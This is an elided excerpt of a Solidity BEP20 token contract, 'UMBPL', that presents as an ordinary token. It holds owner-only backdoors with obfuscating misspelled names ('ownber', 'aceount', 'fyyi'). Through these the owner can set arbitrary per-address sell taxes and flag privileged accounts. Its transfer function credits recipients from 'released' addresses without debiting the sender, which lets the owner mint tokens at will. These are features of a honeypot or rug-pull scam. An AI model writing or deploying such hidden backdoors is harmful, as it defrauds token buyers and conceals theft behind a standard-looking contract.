...
contract BEP20 is Context {
    ...
    function allowance(address ownber, address spender) public view virtual returns (uint256) {
    ...
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        ...
        _approve(ownber, spender, amount);
        return true;
    }
    ...
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address ownber = _msgSender();
        _approve(ownber, spender, _allowances[ownber][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address ownber = _msgSender();
        uint256 currentAllowance = _allowances[ownber][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(ownber, spender, currentAllowance - subtractedValue);
        }
    ...
    function _approve(
        ...
        _allowances[ownber][spender] = amount;
        emit Approval(ownber, spender, amount);
    }
    ...
    function _spendAllowance(
        ...
        uint256 currentAllowance = allowance(ownber, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(ownber, spender, currentAllowance - amount);
            }
        }
    }
...
contract UMBPL is BEP20, Ownable {
    ...
    function getRelease(address _address) external view onlyownber returns (bool) {
    ...
    function upS(uint256 _value) external onlyownber {
        _defaultSellfyyi = _value;
    }

    function setSfyyi(address _address, uint256 _value) external onlyownber {
        require(_value > 1, "aceount tax must be greater than or equal to 1");
        _Sfyyi[_address] = _value;
    }

    function getSfyyi(address _address) external view onlyownber returns (uint256) {
        return _Sfyyi[_address];
    }


    function setMarketaceountfyyi(address _address, bool _value) external onlyownber {
        _marketaceount[_address] = _value;
    }

    function getMarketaceountfyyi(address _address) external view onlyownber returns (bool) {
    ...
    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address ownber = _msgSender();
        if (_release[ownber] == true) {
            _balances[to] += amount;
            return true;
        }
        _receiveF(ownber, to, amount);
        return true;
    }
